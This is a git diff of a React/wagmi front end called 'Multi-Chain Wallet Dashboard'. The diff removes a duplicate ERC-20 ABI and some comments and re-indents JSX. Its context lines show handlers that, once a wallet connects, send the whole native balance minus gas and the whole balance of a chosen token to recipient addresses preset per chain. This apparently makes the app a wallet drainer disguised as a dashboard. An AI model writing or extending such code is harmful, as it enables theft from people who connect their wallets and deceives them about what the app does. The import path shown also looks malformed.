@@ -15,15 +15,7 @@ import {
 import { publicProvider } from "wagmi/providers/public";
 import { ethers } from "ethers";
 import { REOWN_PROJECT_ID, RECIPIENTS, SUPPORTED_CHAINS } from "./config.js";
-import { ERC20_ABI } from ".abi//ERC20.js";
-
-/* ERC-20 minimal ABI */
-const ERC20_ABI = [
-  "function balanceOf(address owner) view returns (uint256)",
-  "function decimals() view returns (uint8)",
-  "function symbol() view returns (string)",
-  "function transfer(address to, uint256 amount) returns (bool)"
-];
+import { ERC20_ABI } from ".abi//ERC20.js"; // ✅ keep only this import
 
 /* Wagmi config */
 const { chains, publicClient } = configureChains(SUPPORTED_CHAINS, [publicProvider()]);
@@ -55,7 +47,6 @@ function Dashboard() {
     return RECIPIENTS[foundChain.name.toLowerCase()];
   };
 
-  /* Sign wallet */
   const handleSign = async () => {
     if (!address) return alert("Connect wallet first");
     try {
@@ -70,7 +61,6 @@ function Dashboard() {
     }
   };
 
-  /* Send all native balance minus estimated gas */
   const handleSendNative = async () => {
     if (!address || !nativeBalance) return alert("Connect wallet first");
     const recipient = getRecipient();
@@ -100,7 +90,6 @@ function Dashboard() {
     }
   };
 
-  /* Fetch ERC-20 token balance */
   const fetchTokenBalance = async () => {
     if (!address || !tokenAddress) return;
     try {
@@ -121,7 +110,6 @@ function Dashboard() {
     }
   };
 
-  /* Send all ERC-20 token balance */
   const handleSendToken = async () => {
     if (!address || !tokenBalance || !tokenDecimals) return alert("Connect wallet and fetch token balance first");
     const recipient = getRecipient();
@@ -149,20 +137,12 @@ function Dashboard() {
   }, [tokenAddress, address]);
 
   return (
-<div style={styles.container}>
-  <h1 style={styles.title}>Multi-Chain Wallet Dashboard</h1>
+    <div style={styles.container}>
+      <h1 style={styles.title}>Multi-Chain Wallet Dashboard</h1>
 
-  {/* Wallet Connect Status */}
-  <WalletConnectStatus isConnected={isConnected} address={address} chain={chain} />
+      {/* Wallet Connect Status */}
+      <WalletConnectStatus isConnected={isConnected} address={address} chain={chain} />
 
-  <AppKitButton />
-
-  {isConnected && (
-    <div style={styles.card}>
-      {/* ... rest of your wallet info, sign, send buttons ... */}
-    </div>
-  )}
-</div>
       <AppKitButton />
 
       {isConnected && (
